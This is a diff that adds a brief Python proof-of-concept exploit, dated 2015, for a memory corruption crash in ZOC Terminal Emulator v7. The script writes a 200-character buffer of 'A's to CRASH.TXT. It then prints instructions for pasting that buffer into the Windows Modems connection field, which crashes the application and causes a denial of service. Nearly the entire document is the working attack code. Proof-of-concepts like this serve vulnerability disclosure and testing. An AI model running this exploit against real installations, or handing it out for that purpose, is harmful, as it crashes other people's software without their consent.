@@ -1,0 +1,33 @@
+#!/usr/bin/python
+
+#[+] Author: SATHISH ARTHAR
+#[+] Exploit Title:  ZOC Terminal Emulator-v7 Memory Corruption PoC
+#[+] Date: 14-07-2015
+#[+] Category: DoS/PoC
+#[+] Tested on: WinXp/Windows7/windows8 
+#[+] Vendor: http://www.emtec.com
+#[+] Download: http://www.emtec.com/downloads/zoc/zoc7051.exe
+#[+] Sites: sathisharthars.wordpress.com
+#[+] Twitter: @sathisharthars
+#[+] Thanks:   offensive security (@offsectraining)
+
+ 
+
+print"###########################################################"
+print"#  Title: ZOC Terminal Emulator-v7  Memory Corruption PoC  #"
+print"#  Author: SATHISH ARTHAR                                  #"
+print"#  Category: DoS/PoC                                       # "
+print"###########################################################"
+print"Copy the content of CRASH.TXT in connect to option and set Connection type to Windows Modems"
+print" Quick Connection ----> Connection type: Windows Modems ----> connect" 
+
+
+crash= "A" * 200	
+filename = "CRASH.TXT"
+file = open(filename , "w")
+file.write(crash)
+print "\n Files Created!\n"
+file.close()
+
+
+
